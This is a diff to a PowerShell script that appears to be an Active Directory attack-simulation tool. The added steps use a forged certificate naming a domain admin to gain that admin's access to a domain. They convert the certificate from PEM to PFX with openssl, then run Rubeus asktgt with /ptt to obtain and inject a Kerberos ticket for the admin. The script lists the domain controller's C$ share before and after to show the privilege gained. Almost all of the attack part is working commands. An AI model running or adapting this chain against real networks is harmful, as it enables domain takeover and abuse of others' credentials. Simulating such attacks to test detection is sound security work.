@@ -2604,6 +2604,7 @@ write-log -Message "Start Attack Level - Steal or Forge Authentication Certifica
 $CAtemplate = "AS2Go"
 $altname =    $domainadmin
 $pemFile =    ".\$altname.pem"
+$pfxFile =    ".\$altname.pfx"
 
 Write-Host "____________________________________________________________________`n" 
 Write-Host "      Step 1 - Get the Enterprise Certification Authority"
@@ -2622,7 +2623,7 @@ Invoke-Command -ScriptBlock {certutil}
 Write-Host ""
 
 $MyCAConfig = Invoke-Command -ScriptBlock {certutil}
-$temp       = $MyCAConfig[7].Split([char]0x0060).Split([char]0x0027)
+$temp       = $MyCAConfig[7].Split([char]0x0060).Split([char]0x0027).Split([char]0x0022)
 $myEntCA    = $temp[1]
 Write-Host "Found & use Enterprise Certification Authority: $myEntCA`n" -ForegroundColor $global:FGCHighLight
 pause
@@ -2713,16 +2714,62 @@ pause
 
 Clear-Host
 Write-Host "____________________________________________________________________`n" 
-Write-Host "      Step 4 - Converting PEM to PFX                   "
+Write-Host "      Step 4 - Converting PEM to PFX via openSSL                  "
 Write-Host "____________________________________________________________________`n"
 
+Write-Host "`nNext Step:"
+
+$convert = "openssl pkcs12 -in $pemFile -keyex -CSP ""Microsoft Enhanced Cryptographic Provider v1.0"" -export -out $pfxFile" 
+
+Write-Host $convert -ForegroundColor $global:FGCCommand
 
 
+pause
+
+
+try
+{
+Write-Output $convert  | Set-Clipboard
+}
+catch
+{
+Write-Output $convert  | clip
+}
+
+
+Invoke-Item "C:\Program Files\OpenSSL-Win64\start.bat"
+
+
+pause
+
+Get-Item $pfxFile
+
+pause
 
 Clear-Host
 Write-Host "____________________________________________________________________`n" 
-Write-Host "      Step 5 - Converting PEM to PFX                   "
+Write-Host "      Step 5 - Request a Kerberos TGT "
+Write-Host "               for the user for which we minted the new certificate                  "
 Write-Host "____________________________________________________________________`n"
+
+$password = Read-Host "Password from pfx file - $pfxFile"
+$request = "Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /password:$password /ptt"
+
+Write-Host "`nNext Step:"
+Write-Host $request -ForegroundColor $global:FGCCommand
+
+pause
+
+Write-Host "Before"
+dir $env:LOGONSERVER\c$
+
+
+Invoke-Command -ScriptBlock {.\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /password:$password /ptt}
+
+pause
+dir $env:LOGONSERVER\c$
+
+pause
 
 Try
 {
